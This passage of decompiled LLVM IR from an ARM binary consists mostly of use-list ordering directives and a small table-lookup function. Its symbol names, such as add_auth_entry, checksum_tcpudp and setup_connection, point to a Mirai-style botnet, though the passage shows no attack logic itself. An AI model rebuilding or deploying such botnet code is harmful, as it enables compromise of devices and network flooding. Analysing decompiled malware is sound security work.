  uselistorder i32 %v1_ef48, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_ef78, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_eedc, { 1, 0 }
  uselistorder i8 %v3_eed4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eecc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_eecc, { 0, 2, 1 }
  uselistorder i32 %v0_eec4, { 1, 0 }
  uselistorder i1 %v7_eec0, { 1, 0 }
  uselistorder i1 %v7_eeb8, { 1, 0 }
  uselistorder i1 %v7_eeb0, { 1, 0 }
  uselistorder i1 %v7_ee9c, { 1, 0 }
  uselistorder i1 %v7_ee94, { 1, 0 }
  uselistorder i1 %v7_ee8c, { 1, 0 }
  uselistorder i1 %v8_ee84, { 1, 0 }
  uselistorder i32 %v1_ee6c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_ee08, { 1, 0 }
  uselistorder i8 %v3_ee00, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_edf8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_edf8, { 0, 2, 1 }
  uselistorder i32 %v0_edf0, { 1, 0 }
  uselistorder i1 %v7_edec, { 1, 0 }
  uselistorder i1 %v7_ede4, { 1, 0 }
  uselistorder i1 %v7_eddc, { 1, 0 }
  uselistorder i1 %v7_edc8, { 1, 0 }
  uselistorder i1 %v7_edc0, { 1, 0 }
  uselistorder i1 %v7_edb8, { 1, 0 }
  uselistorder i1 %v8_edb0, { 1, 0 }
  uselistorder i32 %v1_ed98, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_ed84, { 1, 2, 0 }
  uselistorder i32 %v2_ed70, { 1, 0 }
  uselistorder i32 %v0_ed70, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_ed6c, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_ed44, { 2, 1, 0 }
  uselistorder i1 %v7_ed20, { 1, 0 }
  uselistorder i32 %v4_ed1c, { 1, 0, 2 }
  uselistorder i32 %v1_ecdc, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_ecc0, { 1, 0 }
  uselistorder i32 %v1_ecb0, { 2, 1, 0 }
  uselistorder i32 %v1_ecac, { 1, 0 }
  uselistorder i32 %v0_ec50, { 2, 5, 6, 20, 7, 8, 21, 9, 10, 24, 11, 12, 22, 13, 14, 23, 4, 3, 19, 15, 16, 25, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_ec2c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_ec28, { 1, 0 }
  uselistorder i32 %v4_ec0c, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_ebf8, { 1, 0, 2 }
  uselistorder i32 %v3_ebf4, { 1, 0, 2 }
  uselistorder i32 %v0_f6b0, { 1, 0, 2 }
  uselistorder i32 %v3_ebc0, { 1, 0 }
  uselistorder i32 %v1_eba8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_eba4, { 1, 0 }
  uselistorder i32 %v3_eb9c, { 1, 2, 0 }
  uselistorder i1 %v7_eb8c, { 1, 0 }
  uselistorder i32 %v3_eb88, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_eb7c, { 1, 0 }
  uselistorder i32 %v1_eb24, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eb24, { 0, 1, 3, 2 }
  uselistorder i32 %v0_eb08, { 0, 2, 1 }
  uselistorder i32 %v1_eb00, { 1, 0 }
  uselistorder i32 %v1_eac0, { 2, 1, 0 }
  uselistorder i32 %v1_eabc, { 1, 0 }
  uselistorder i1 %v2_ea9c, { 1, 0, 2 }
  uselistorder i32 %v0_ea98, { 1, 0, 2 }
  uselistorder i1 %v7_ea64, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_ea64, { 1, 0, 2 }
  uselistorder i32 %v2_ea5c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_ea50, { 1, 0, 2 }
  uselistorder i32 %v0_ea54, { 1, 0 }
  uselistorder i32 %v1_ea38, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_ea2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ea2c, { 0, 2, 1 }
  uselistorder i32 %v1_ea1c, { 1, 0 }
  uselistorder i32 %v3_eae8, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_e97c, { 1, 0 }
  uselistorder i32 %v1_e964, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e970, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e920, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_e914, { 2, 1, 0 }
  uselistorder i32 %v1_e8f4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_e8d8, { 0, 1, 3, 2 }
  uselistorder i1 %v2_e8d0, { 1, 0 }
  uselistorder i1 %v9_e89c, { 1, 0 }
  uselistorder i32 %v0_e84c, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e7f0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_e7a0, { 1, 0 }
  uselistorder i32 %v5_e738, { 1, 0 }
  uselistorder i32 %v3_e728, { 1, 2, 0 }
  uselistorder i16 %v4_e724, { 1, 0 }
  uselistorder i32 %v3_e724, { 1, 0 }
  uselistorder i32 %v5_e6f8, { 0, 3, 1, 2 }
  uselistorder i1 %v2_e660, { 1, 0 }
  uselistorder i1 %v2_e64c, { 1, 0 }
  uselistorder i1 %v2_e638, { 1, 0 }
  uselistorder i32 %.462, { 2, 1, 0 }
  uselistorder i1 %v7_e614, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e5fc, { 1, 0 }
  uselistorder i1 %v3_e5e0, { 1, 0, 2 }
  uselistorder i1 %v2_e5cc, { 1, 0 }
  uselistorder i1 %v2_e5a8, { 1, 0 }
  uselistorder i32 %v1_e558, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e544, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e540, { 4, 5, 6, 0, 7, 1, 2, 3, 8 }
  uselistorder i32 %v0_e528, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e510, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f640, { 1, 2, 3, 0 }
  uselistorder i32 %v2_f484, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f52c, { 1, 2, 0 }
  uselistorder i32 %v2_eaf4, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e4e8, { 0, 2, 4, 7, 6, 8, 1, 3, 5, 9, 10 }
  uselistorder i32 %v4_e3b8, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e34c.le, { 1, 0 }
  uselistorder i32 %v0_e330, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e304, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e2d0, { 1, 0 }
  uselistorder i32 %v3_e2c8, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_e2b4, { 1, 0 }
  uselistorder i32 %v2_e298, { 1, 0, 2 }
  uselistorder i32 %v0_e284, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e1f8, { 3, 1, 2, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 128, 127, 129, 130, 132, 131, 133, 134, 35, 165, 62, 63, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 64, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 159, 160, 162, 161, 158, 164, 163, 66, 68, 69, 67, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 65, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 97, 100, 99, 108, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111, 112, 113 }
  uselistorder i32* %r2.global-to-local, { 82, 83, 84, 85, 86, 87, 88, 35, 36, 37, 89, 90, 91, 92, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 80, 81, 108, 109, 111, 110, 107, 115, 112, 116, 42, 113, 114, 43, 44, 45, 46, 47, 48, 49, 50, 51, 105, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 }
  uselistorder i32* %r1.global-to-local, { 85, 86, 87, 88, 89, 90, 91, 42, 44, 43, 45, 92, 93, 94, 29, 46, 47, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 103, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 83, 84, 48, 49, 95, 96, 97, 98, 99, 100, 101, 102, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i32* %r0.global-to-local, { 156, 155, 157, 158, 159, 161, 160, 162, 163, 164, 165, 167, 168, 166, 82, 81, 83, 85, 84, 86, 87, 88, 90, 89, 23, 25, 172, 169, 1, 3, 2, 4, 170, 171, 0, 173, 91, 175, 59, 61, 60, 93, 92, 94, 96, 95, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 196, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 73, 75, 74, 77, 76, 79, 78, 80, 102, 104, 103, 105, 101, 106, 107, 188, 174, 178, 176, 177, 183, 179, 180, 195, 181, 182, 184, 186, 185, 187, 189, 194, 190, 193, 191, 192, 111, 109, 110, 114, 112, 113, 116, 115, 154, 108, 118, 117, 119, 121, 120, 123, 122, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 143, 142, 144, 149, 145, 146, 147, 148, 150, 151, 152, 153 }
  uselistorder i32* %ip.global-to-local, { 17, 18, 19, 0, 20, 23, 21, 22, 2, 1, 3, 4, 5, 6, 7, 8, 9, 16, 10, 11, 12, 13, 14, 15 }
  uselistorder i1* %cpsr_z.global-to-local, { 110, 114, 222, 0, 200, 3, 111, 112, 209, 210, 115, 202, 117, 119, 120, 67, 68, 69, 70, 71, 2, 116, 4, 5, 6, 12, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 118, 19, 20, 25, 21, 22, 23, 24, 26, 27, 28, 29, 30, 34, 35, 36, 31, 32, 33, 37, 38, 39, 40, 41, 42, 46, 47, 48, 43, 44, 45, 49, 50, 51, 52, 53, 54, 58, 59, 60, 55, 56, 57, 61, 62, 63, 64, 65, 66, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 203, 89, 90, 91, 86, 87, 88, 92, 93, 94, 95, 96, 97, 101, 102, 103, 98, 99, 100, 104, 105, 106, 107, 108, 109, 121, 122, 123, 124, 211, 213, 212, 214, 215, 216, 217, 218, 219, 220, 221, 239, 204, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 235, 237, 238, 236, 233, 234, 208, 207, 205, 129, 206, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 1, 168, 169, 128, 170, 171, 127, 172, 173, 174, 175, 176, 177, 126, 178, 179, 180, 181, 182, 125, 183, 184, 185, 201, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 113, 199 }
  uselistorder i1* %cpsr_c.global-to-local, { 107, 109, 218, 0, 193, 2, 205, 204, 106, 206, 110, 197, 111, 113, 114, 66, 67, 68, 69, 1, 196, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 112, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 33, 34, 35, 30, 31, 32, 36, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 122, 85, 86, 87, 82, 83, 84, 88, 89, 90, 91, 92, 93, 97, 98, 99, 94, 95, 96, 100, 101, 102, 103, 104, 105, 115, 116, 117, 207, 209, 208, 210, 211, 212, 213, 214, 215, 216, 217, 198, 199, 219, 220, 221, 222, 223, 224, 225, 226, 229, 231, 232, 230, 227, 228, 203, 202, 200, 123, 201, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 121, 160, 161, 120, 162, 163, 119, 164, 165, 166, 167, 168, 169, 118, 170, 171, 172, 173, 174, 195, 175, 176, 177, 194, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 108, 192 }
  uselistorder i32 (i32)* @inet_addr, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_18d6c.85 to i32), { 0, 2, 1, 3 }
  uselistorder i16** @global_var_21724.139, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_21724.139 to i16*), { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_18e10.199 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 10, 9, 8, 7, 6, 5, 4, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 26, 39, 38, 25, 32, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 24, 0, 22, 21, 20, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 36, 12, 13, 14, 11, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 (i32)* @table_unlock_val, { 22, 21, 30, 29, 28, 27, 26, 25, 24, 23, 20, 0, 18, 17, 16, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 0, 1 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_21710.194, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2170c.152 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_21702.191 to i16*), { 1, 0, 2 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18df0.185 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18de8.183 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18dac.171 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18d88.163 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_18d8c.161 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_21719.158, { 1, 0 }
  uselistorder i16* @global_var_2170e.157, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 1, 0, 2 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_2170c.152, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_2170c.152 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_21718.153, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_216f8.149, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_216f8.149 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 16, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 4, 3, 2, 1, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_24210.147, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_2420c.145, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_21728.133, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_241f0.57, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_241f0.57 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f898, { 1, 0 }
  uselistorder label %dec_label_pc_f890, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_f884, { 1, 0 }
  uselistorder label %dec_label_pc_ebd4.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ebd4.backedge.thread559, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ebd4.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f674, { 1, 0 }
  uselistorder label %dec_label_pc_f5d4, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f59c, { 1, 0 }
  uselistorder label %dec_label_pc_f588, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f578, { 1, 0 }
  uselistorder label %dec_label_pc_f468, { 1, 0 }
  uselistorder label %dec_label_pc_f3e8, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f3b4, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f364, { 1, 0 }
  uselistorder label %dec_label_pc_f2a8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f290, { 1, 0 }
  uselistorder label %dec_label_pc_f15c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f144, { 1, 0 }
  uselistorder label %dec_label_pc_f088, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f070, { 1, 0 }
  uselistorder label %dec_label_pc_effc, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_efc8, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_efa8, { 1, 0 }
  uselistorder label %dec_label_pc_ef94, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ef50, { 1, 0 }
  uselistorder label %dec_label_pc_ef50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_eee4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_eecc, { 1, 0 }
  uselistorder label %dec_label_pc_ee10, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_edf8, { 1, 0 }
  uselistorder label %dec_label_pc_ecd8, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %bb420, { 1, 0 }
  uselistorder label %dec_label_pc_eca0, { 1, 0 }
  uselistorder label %dec_label_pc_ec38, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ebec, { 1, 0 }
  uselistorder label %dec_label_pc_ebdc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ebdc.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ebb8, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %dec_label_pc_eadc, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 1, 0 }
  uselistorder label %bb408, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_e9d0.dec_label_pc_e9d0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e9ac.dec_label_pc_e9ac_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e9a0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e988, { 1, 0 }
  uselistorder label %dec_label_pc_e964, { 1, 0 }
  uselistorder label %dec_label_pc_e818, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_e804, { 1, 0 }
  uselistorder label %bb405, { 1, 0 }
  uselistorder label %dec_label_pc_e698, { 1, 0 }
  uselistorder label %dec_label_pc_e68c, { 1, 0 }
  uselistorder label %dec_label_pc_e680, { 1, 0 }
  uselistorder label %dec_label_pc_e674, { 1, 0 }
  uselistorder label %dec_label_pc_e668, { 1, 0 }
  uselistorder label %dec_label_pc_e654, { 1, 0 }
  uselistorder label %dec_label_pc_e640, { 1, 0 }
  uselistorder label %dec_label_pc_e62c, { 1, 0 }
  uselistorder label %dec_label_pc_e60c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e5e8, { 1, 0 }
  uselistorder label %dec_label_pc_e5dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e5b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e594, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e540, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_e330, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2421c.209 to i32), i32* @r2, align 4
  %v3_f940 = mul i32 %arg1, 8
  %v2_f944 = add i32 %v3_f940, ptrtoint (i32* @global_var_2421c.209 to i32)
  store i32 %v2_f944, i32* @r3, align 4
  %v2_f948 = icmp eq i32* %arg2, null
  br i1 %v2_f948, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_f9504 = inttoptr i32 %v2_f944 to i32*
  %v4_f9505 = load i32, i32* %v3_f9504, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_f94c = add i32 %v3_f940, add (i32 ptrtoint (i32* @global_var_2421c.209 to i32), i32 4)
  %v3_f94c = inttoptr i32 %v2_f94c to i16*
  %v4_f94c = load i16, i16* %v3_f94c, align 4
  %v5_f94c = zext i16 %v4_f94c to i32
  store i32 %v5_f94c, i32* @r3, align 4
  %v3_f950 = inttoptr i32 %v2_f944 to i32*
  %v4_f950 = load i32, i32* %v3_f950, align 4
  store i32 %v5_f94c, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_f9506 = phi i32 [ %v4_f9505, %.thread ], [ %v4_f950, %bb ]
  ret i32 %v4_f9506

; uselistorder directives
  uselistorder i32 %v2_f944, { 1, 0, 2 }
  uselistorder i32 %v3_f940, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f968 = mul i32 %arg1, 8
